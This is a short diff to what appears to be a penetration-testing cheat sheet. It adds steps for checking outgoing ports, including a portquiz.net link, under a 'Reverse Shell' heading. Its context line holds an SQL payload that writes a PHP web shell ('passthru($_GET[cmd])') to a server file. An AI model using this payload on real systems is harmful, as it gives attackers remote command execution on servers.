@@ -26,7 +26,13 @@ SELECT '<?php passthru($_GET[cmd]);?>' INTO OUTFILE '<file_location>/<filename>'
 ## Reverse Shell
 
 
-### Check FW
+### Check outgoing ports 
+
+**Internet**
+
+- [portquiz](http://portquiz.net/)
+
+**local** 
 
 ```bash
 # Generate and execute on target
